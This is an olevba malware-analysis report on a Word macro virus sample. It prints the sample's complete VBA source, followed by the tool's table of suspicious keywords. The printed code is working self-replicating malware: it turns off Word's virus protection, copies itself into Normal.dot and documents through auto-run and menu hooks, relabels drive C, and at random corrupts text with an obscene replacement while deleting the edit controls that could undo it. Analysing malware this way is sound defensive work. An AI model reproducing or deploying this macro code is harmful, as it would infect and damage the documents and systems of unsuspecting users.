olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPC-based-88084cd723f38f2b66c83c9c802c9355842477f7
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.VMPC-based-88084cd723f38f2b66c83c9c802c9355842477f7 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Suca.bas 
in file: Virus.MSWord.VMPC-based-88084cd723f38f2b66c83c9c802c9355842477f7 - OLE stream: 'Macros/VBA/Suca'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Sub Suca()
    

    
On Error Resume Next
Randomize
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
ActiveDocument.VBProject.VBComponents("Suca").Export "c:\Suca.drv"
ActiveDocument.ReadOnlyRecommended = False
AyVi = Int(Rnd * 100)
If AyVi = 3 Then Call NzOy1615AySf
If NormalTemplate.VBProject.VBComponents.Item("Suca").Name <> "Suca" Then HmVv9044408711 = True
If ActiveDocument.VBProject.VBComponents.Item("Suca").Name <> "Suca" Then LeAk40874 = True
If HmVv9044408711 = True And LeAk40874 = False Then Set OgFi408790446 = NormalTemplate.VBProject.VBComponents
If HmVv9044408711 = False And LeAk40874 = True Then Set OgFi408790446 = ActiveDocument.VBProject.VBComponents
OgFi408790446.import "c:\Suca.drv"
If HmVv9044408711 = True And LeAk40874 = False Then Shell ("label c: Suca"), 0
If activeinst = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If LeAk40874 = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
NkDyDrNi:
End Sub
Sub FileSave()
    On Error Resume Next
    Call Suca
    ActiveDocument.Save
End Sub
Sub FileClose()
    On Error Resume Next
    Call Suca
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub FileSaveAs()
    On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
    Call Suca
End Sub
Sub FileExit()
    On Error Resume Next
    Call Suca
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call Suca
End Sub
Sub AutoExit()
    On Error Resume Next
    Call Suca
End Sub
Sub AutoClose()
    On Error Resume Next
    Call Suca
End Sub
Sub ToolsMacro()
    On Error Resume Next
    Call Suca
End Sub
Sub FileTemplates()
    On Error Resume Next
    Call Suca
End Sub
Sub ViewVBCode()
    On Error Resume Next
    Call Suca
End Sub
Sub NzOy1615AySf()
    On Error Resume Next
        Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .Text = "il"
            .Replacement.Text = "il cazzo duro"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

